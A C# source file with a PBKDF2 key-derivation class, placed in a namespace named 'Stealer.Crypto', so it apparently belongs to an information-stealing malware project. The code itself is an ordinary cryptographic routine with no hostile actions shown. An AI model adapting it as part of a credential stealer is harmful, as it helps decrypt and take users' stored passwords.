using System;
using System.Security.Cryptography;

namespace Stealer.Crypto
{
    public class PBKDF2
    {
        private HMAC Algorithm { get; }
        private byte[] Salt { get; }
        private int IterationCount { get; }

        private readonly int _blockSize;
        private uint _blockIndex = 1U;
        private byte[] _bufferBytes;
        private int _bufferStartIndex;
        private int _bufferEndIndex;

        public PBKDF2(HMAC algorithm, byte[] password, byte[] salt, int iterations)
        {
            if (algorithm == null)
                throw new ArgumentNullException("algorithm", "Algorithm cannot be null.");
            
            this.Algorithm = algorithm;
            
            if (password == null)
                throw new ArgumentNullException("password", "Password cannot be null.");
            
            this.Algorithm.Key = password;
            
            if (salt == null)
                throw new ArgumentNullException("salt", "Salt cannot be null.");
            
            this.Salt = salt;
            this.IterationCount = iterations;
            this._blockSize = this.Algorithm.HashSize / 8;
            this._bufferBytes = new byte[this._blockSize];
        }

        public byte[] GetBytes(int count)
        {
            byte[] array = new byte[count];
            int i = 0;
            int num = this._bufferEndIndex - this._bufferStartIndex;
            
            if (num > 0)
            {
                if (count < num)
                {
                    Buffer.BlockCopy(this._bufferBytes, this._bufferStartIndex, array, 0, count);
                    this._bufferStartIndex += count;
                    return array;
                }
                Buffer.BlockCopy(this._bufferBytes, this._bufferStartIndex, array, 0, num);
                this._bufferStartIndex = (this._bufferEndIndex = 0);
                i += num;
            }
            
            while (i < count)
            {
                int num2 = count - i;
                this._bufferBytes = this.Func();
                
                if (num2 <= this._blockSize)
                {
                    Buffer.BlockCopy(this._bufferBytes, 0, array, i, num2);
                    this._bufferStartIndex = num2;
                    this._bufferEndIndex = this._blockSize;
                    return array;
                }
                
                Buffer.BlockCopy(this._bufferBytes, 0, array, i, this._blockSize);
                i += this._blockSize;
            }
            
            return array;
        }

        private byte[] Func()
        {
            byte[] array = new byte[this.Salt.Length + 4];
            Buffer.BlockCopy(this.Salt, 0, array, 0, this.Salt.Length);
            Buffer.BlockCopy(GetBytesFromInt(this._blockIndex), 0, array, this.Salt.Length, 4);
            
            byte[] array2 = this.Algorithm.ComputeHash(array);
            byte[] array3 = array2;
            
            for (int i = 2; i <= this.IterationCount; i++)
            {
                array2 = this.Algorithm.ComputeHash(array2, 0, array2.Length);
                for (int j = 0; j < this._blockSize; j++)
                {
                    array3[j] ^= array2[j];
                }
            }
            
            if (this._blockIndex == uint.MaxValue)
                throw new InvalidOperationException("Derived key too long.");
            
            this._blockIndex += 1U;
            return array3;
        }

        private static byte[] GetBytesFromInt(uint i)
        {
            byte[] bytes = BitConverter.GetBytes(i);
            
            if (!BitConverter.IsLittleEndian)
                return bytes;
            
            return new byte[]
            {
                bytes[3],
                bytes[2],
                bytes[1],
                bytes[0]
            };
        }
    }
}
